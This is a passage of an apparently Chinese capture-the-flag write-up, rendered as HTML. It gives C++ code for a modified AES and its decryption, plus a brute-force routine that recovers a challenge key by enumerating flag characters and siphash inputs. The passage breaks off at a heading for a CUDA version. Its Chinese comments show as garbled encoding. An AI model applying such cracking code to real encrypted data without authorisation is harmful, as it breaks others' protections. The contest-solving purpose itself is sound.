class="type">char</span>*)rndList);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”¨hashç”ŸæˆKey</span></span><br><span class="line"><span class="type">uint8_t</span> key[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">key[i] = (<span class="type">uint8_t</span>)(hash &gt;&gt; (i * <span class="number">8</span> &amp; <span class="number">0x3f</span>));</span><br><span class="line">key[i * <span class="number">2</span> + <span class="number">1</span>] = (<span class="type">uint8_t</span>)(hash &gt;&gt; (i * <span class="number">-8</span> + <span class="number">0x38</span> &amp; <span class="number">0x3f</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i += <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">aesEncrypt</span>(key, <span class="number">16</span>, input + i, out, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>, out[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>AESé­”æ”¹åè§£å¯†ä»£ç ï¼š</p><p>ä»£ç åŸºäºï¼š<a href="https://github.com/lmshao/AES">https://github.com/lmshao/AES</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> inv_S[] = &#123; <span class="number">0xD1</span>, <span class="number">0x41</span>, <span class="number">0x09</span>, <span class="number">0xF9</span>, <span class="number">0x3F</span>, <span class="number">0x56</span>, <span class="number">0xFF</span>, <span class="number">0xCD</span>, <span class="number">0x1F</span>, <span class="number">0x91</span>, <span class="number">0xFB</span>, <span class="number">0xD4</span>, <span class="number">0x94</span>, <span class="number">0x27</span>, <span class="number">0xDC</span>, <span class="number">0xBB</span>, <span class="number">0x5B</span>, <span class="number">0xA9</span>, <span class="number">0xFA</span>, <span class="number">0xEA</span>, <span class="number">0xEF</span>, <span class="number">0x47</span>, <span class="number">0xA8</span>, <span class="number">0x6D</span>, <span class="number">0x32</span>, <span class="number">0xE4</span>, <span class="number">0x4D</span>, <span class="number">0xDF</span>, <span class="number">0xB2</span>, <span class="number">0xD6</span>, <span class="number">0x01</span>, <span class="number">0x8A</span>, <span class="number">0x07</span>, <span class="number">0x79</span>, <span class="number">0x21</span>, <span class="number">0x12</span>, <span class="number">0x4B</span>, <span class="number">0xC8</span>, <span class="number">0xD2</span>, <span class="number">0x77</span>, <span class="number">0xFE</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x5C</span>, <span class="number">0x7B</span>, <span class="number">0xF8</span>, <span class="number">0x43</span>, <span class="number">0x37</span>, <span class="number">0x4F</span>, <span class="number">0x59</span>, <span class="number">0x26</span>, <span class="number">0xC4</span>, <span class="number">0xF0</span>, <span class="number">0xC3</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0xD9</span>, <span class="number">0xC0</span>, <span class="number">0x16</span>, <span class="number">0xA3</span>, <span class="number">0x87</span>, <span class="number">0x03</span>, <span class="number">0xD5</span>, <span class="number">0x00</span>, <span class="number">0xAD</span>, <span class="number">0x23</span>, <span class="number">0x0F</span>, <span class="number">0x5E</span>, <span class="number">0x7F</span>, <span class="number">0x89</span>, <span class="number">0x2A</span>, <span class="number">0x82</span>, <span class="number">0x84</span>, <span class="number">0x30</span>, <span class="number">0x78</span>, <span class="number">0x83</span>, <span class="number">0xEB</span>, <span class="number">0xBA</span>, <span class="number">0x72</span>, <span class="number">0xB7</span>, <span class="number">0xC1</span>, <span class="number">0x05</span>, <span class="number">0x58</span>, <span class="number">0x90</span>, <span class="number">0x0C</span>, <span class="number">0x39</span>, <span class="number">0x50</span>, <span class="number">0x7C</span>, <span class="number">0xD8</span>, <span class="number">0xDD</span>, <span class="number">0x42</span>, <span class="number">0x8B</span>, <span class="number">0x1E</span>, <span class="number">0x4A</span>, <span class="number">0x2C</span>, <span class="number">0x6E</span>, <span class="number">0xE9</span>, <span class="number">0x96</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x49</span>, <span class="number">0xAF</span>, <span class="number">0x3E</span>, <span class="number">0x2F</span>, <span class="number">0x04</span>, <span class="number">0x9A</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x48</span>, <span class="number">0x71</span>, <span class="number">0x0D</span>, <span class="number">0x5D</span>, <span class="number">0x2B</span>, <span class="number">0x7A</span>, <span class="number">0x4C</span>, <span class="number">0x53</span>, <span class="number">0x1D</span>, <span class="number">0x4E</span>, <span class="number">0x33</span>, <span class="number">0xD0</span>, <span class="number">0xDB</span>, <span class="number">0x8F</span>, <span class="number">0xB3</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x7D</span>, <span class="number">0xE5</span>, <span class="number">0x9D</span>, <span class="number">0xF2</span>, <span class="number">0x9B</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x1B</span>, <span class="number">0x80</span>, <span class="number">0xA7</span>, <span class="number">0xB5</span>, <span class="number">0xE0</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x24</span>, <span class="number">0xC9</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x69</span>, <span class="number">0xC5</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0xDE</span>, <span class="number">0x9F</span>, <span class="number">0x55</span>, <span class="number">0xF1</span>, <span class="number">0xA2</span>, <span class="number">0xFD</span>, <span class="number">0xCF</span>, <span class="number">0xF4</span>, <span class="number">0xE2</span>, <span class="number">0xCA</span>, <span class="number">0x0A</span>, <span class="number">0xF6</span>, <span class="number">0xB8</span>, <span class="number">0x2D</span>, <span class="number">0x8D</span>, <span class="number">0x15</span>, <span class="number">0x63</span>, <span class="number">0x6A</span>, <span class="number">0xEE</span>, <span class="number">0x1C</span>, <span class="number">0x22</span>, <span class="number">0xBD</span>, <span class="number">0xA1</span>, <span class="number">0x98</span>, <span class="number">0xB9</span>, <span class="number">0x0B</span>, <span class="number">0xAA</span>, <span class="number">0x73</span>, <span class="number">0x7E</span>, <span class="number">0x99</span>, <span class="number">0x52</span>, <span class="number">0xAE</span>, <span class="number">0x5A</span>, <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x57</span>, <span class="number">0xB1</span>, <span class="number">0x8C</span>, <span class="number">0x9C</span>, <span class="number">0x19</span>, <span class="number">0x5F</span>, <span class="number">0x66</span>, <span class="number">0x34</span>, <span class="number">0x64</span>, <span class="number">0x51</span>, <span class="number">0x17</span>, <span class="number">0x81</span>, <span class="number">0xDA</span>, <span class="number">0xBF</span>, <span class="number">0x8E</span>, <span class="number">0x3A</span>, <span class="number">0x97</span>, <span class="number">0x54</span>, <span class="number">0x3B</span>, <span class="number">0x68</span>, <span class="number">0x70</span>, <span class="number">0xB0</span>, <span class="number">0xEC</span>, <span class="number">0xB6</span>, <span class="number">0xA0</span>, <span class="number">0xFC</span>, <span class="number">0x35</span>, <span class="number">0xAB</span>, <span class="number">0xE3</span>, <span class="number">0x31</span>, <span class="number">0x18</span>, <span class="number">0x14</span>, <span class="number">0x95</span>, <span class="number">0xAC</span>, <span class="number">0x40</span>, <span class="number">0x65</span>, <span class="number">0xA4</span>, <span class="number">0xE7</span>, <span class="number">0x67</span>, <span class="number">0xE1</span>, <span class="number">0xBE</span>, <span class="number">0xC6</span>, <span class="number">0xCB</span>, <span class="number">0xD7</span>, <span class="number">0xCE</span>, <span class="number">0x6B</span>, <span class="number">0xF7</span>, <span class="number">0xA6</span>, <span class="number">0xF3</span>, <span class="number">0x6C</span>, <span class="number">0x11</span>, <span class="number">0x6F</span>, <span class="number">0x92</span>, <span class="number">0x25</span>, <span class="number">0x9E</span>, <span class="number">0x44</span>, <span class="number">0x93</span>, <span class="number">0x2E</span>, <span class="number">0x06</span>, <span class="number">0x88</span>, <span class="number">0x20</span>, <span class="number">0xED</span>, <span class="number">0x85</span>, <span class="number">0xF5</span>, <span class="number">0xB4</span>, <span class="number">0xCC</span>, <span class="number">0xC7</span>, <span class="number">0xE6</span>, <span class="number">0xC2</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x86</span>, <span class="number">0xE8</span>, <span class="number">0x46</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">aesDecrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">uint32_t</span> keyLen, <span class="type">const</span> <span class="type">uint8_t</span> *ct, <span class="type">uint8_t</span> *pt, <span class="type">uint32_t</span> len)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    AesKey aesKey;</span><br><span class="line">    <span class="type">uint8_t</span> *pos = pt;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> *rk = aesKey.dK;</span><br><span class="line">    <span class="type">uint8_t</span> out[BLOCKSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> actualKey[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> state[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(actualKey, key, keyLen);</span><br><span class="line">    <span class="built_in">keyExpansion</span>(actualKey, <span class="number">16</span>, &amp;aesKey);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += BLOCKSIZE) &#123;</span><br><span class="line">        <span class="built_in">loadStateArray</span>(state, ct);</span><br><span class="line">        <span class="built_in">addRoundKey</span>(state, rk);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">10</span>; ++j) &#123;</span><br><span class="line">            rk += <span class="number">4</span>;</span><br><span class="line">            <span class="built_in">invShiftRows</span>(state);</span><br><span class="line">            <span class="built_in">invSubBytes</span>(state);</span><br><span class="line">            <span class="comment">// è§£å¯†äº¤æ¢addRoundKeyå’ŒinvMixColumnsçš„è°ƒç”¨é¡ºåº</span></span><br><span class="line">            <span class="built_in">invMixColumns</span>(state);</span><br><span class="line">            <span class="built_in">addRoundKey</span>(state, rk);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">invSubBytes</span>(state);</span><br><span class="line">        <span class="built_in">invShiftRows</span>(state);</span><br><span class="line">        <span class="built_in">addRoundKey</span>(state, rk<span class="number">+4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">storeStateArray</span>(state, pos);</span><br><span class="line">        pos += BLOCKSIZE;</span><br><span class="line">        ct += BLOCKSIZE;</span><br><span class="line">        rk = aesKey.dK;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CPUçˆ†ç ´æ ·æ¿ä»£ç "><a href="#CPUçˆ†ç ´æ ·æ¿ä»£ç " class="headerlink" title="CPUçˆ†ç ´æ ·æ¿ä»£ç "></a>CPUçˆ†ç ´æ ·æ¿ä»£ç </h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Crack</span><span class="params">(<span class="type">uint8_t</span>* KeyOut)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// å¯†æ–‡</span></span><br><span class="line"><span class="type">uint8_t</span> enc1[<span class="number">48</span>]&#123;<span class="number">0x9f</span>, <span class="number">0xb3</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x23</span>, <span class="number">0x82</span>, <span class="number">0x19</span>, <span class="number">0x7d</span>, <span class="number">0xe7</span>, <span class="number">0x2a</span>, <span class="number">0x8b</span>, <span class="number">0x20</span>, <span class="number">0x0c</span>, <span class="number">0x5b</span>, <span class="number">0x79</span>, <span class="number">0x72</span>, <span class="number">0xf7</span>, <span class="number">0x07</span>, <span class="number">0xa0</span>, <span class="number">0x63</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x49</span>, <span class="number">0xc2</span>, <span class="number">0x51</span>, <span class="number">0xde</span>, <span class="number">0x86</span>, <span class="number">0x1b</span>, <span class="number">0x87</span>, <span class="number">0x2f</span>, <span class="number">0x31</span>, <span class="number">0x6b</span>, <span class="number">0xbc</span>, <span class="number">0xfa</span>, <span class="number">0x5b</span>, <span class="number">0x9a</span>, <span class="number">0x6b</span>, <span class="number">0x12</span>, <span class="number">0x16</span>, <span class="number">0x8b</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x6c</span>, <span class="number">0x1d</span>, <span class="number">0x94</span>, <span class="number">0xba</span>, <span class="number">0x2f</span>, <span class="number">0x37</span> &#125;;</span><br><span class="line">    <span class="comment">// è§£å¯†æ˜æ–‡</span></span><br><span class="line"><span class="type">uint8_t</span> out[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line">    <span class="comment">// çˆ†ç ´ä¸‰ä¸ªå­—èŠ‚å…¨æ’åˆ—</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> c1 = <span class="number">32</span>; c1 &lt; <span class="number">127</span>; c1++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> c2 = <span class="number">32</span>; c2 &lt; <span class="number">127</span>; c2++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> c3 = <span class="number">32</span>; c3 &lt; <span class="number">127</span>; c3++)</span><br><span class="line">&#123;</span><br><span class="line">                <span class="comment">// çˆ†ç ´16ä¸ª01çš„å…¨æ’åˆ—</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> rnd_v = <span class="number">0</span>; rnd_v &lt; <span class="number">0xffff</span>; rnd_v++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint8_t</span> rndList[<span class="number">16</span>]&#123; &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">rndList[i] = i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">rndList[i] += (rnd_v &gt;&gt; (<span class="number">15</span>-i)) &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// ç»„åˆç›®æ ‡hashå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="type">uint8_t</span> hash_plaintext[] = <span class="string">&quot;ISCC&#123;xxx&#125;&quot;</span>;</span><br><span class="line">hash_plaintext[<span class="number">5</span>] = c1;</span><br><span class="line">hash_plaintext[<span class="number">6</span>] = c2;</span><br><span class="line">hash_plaintext[<span class="number">7</span>] = c3;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> hash = <span class="built_in">siphash24</span>(hash_plaintext, <span class="number">9</span>, (<span class="type">const</span> <span class="type">char</span>*)rndList);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// æ‰©å±•ç”ŸæˆKey</span></span><br><span class="line"><span class="type">uint8_t</span> key[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">key[i] = (<span class="type">uint8_t</span>)(hash &gt;&gt; (i * <span class="number">8</span> &amp; <span class="number">0x3f</span>));</span><br><span class="line">key[i * <span class="number">2</span> + <span class="number">1</span>] = (<span class="type">uint8_t</span>)(hash &gt;&gt; (i * <span class="number">-8</span> + <span class="number">0x38</span> &amp; <span class="number">0x3f</span>));</span><br><span class="line">&#125;</span><br><span class="line">                    <span class="comment">// ä»…è§£å¯†å‰16å­—èŠ‚ç”¨äºæ ¡éªŒKey</span></span><br><span class="line"><span class="built_in">aesDecrypt</span>(key, <span class="number">16</span>, enc1, out, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (out[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span> &amp;&amp; out[<span class="number">1</span>] == <span class="string">&#x27;S&#x27;</span> &amp;&amp; out[<span class="number">2</span>] == <span class="string">&#x27;C&#x27;</span> &amp;&amp; out[<span class="number">3</span>] == <span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(KeyOut, key, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, key[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CPUçˆ†ç ´ä»£ç è½¬CUDAçˆ†ç ´ä»£ç "><a href="#CPUçˆ†ç ´ä»£ç è½¬CUDAçˆ†ç ´ä»£ç " class="headerlink" title="CPUçˆ†ç ´ä»£ç è½¬CUDAçˆ†ç ´ä»£ç "></a>CPUçˆ†ç ´ä»£ç è½¬CUDAçˆ†ç ´ä»£ç </h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span 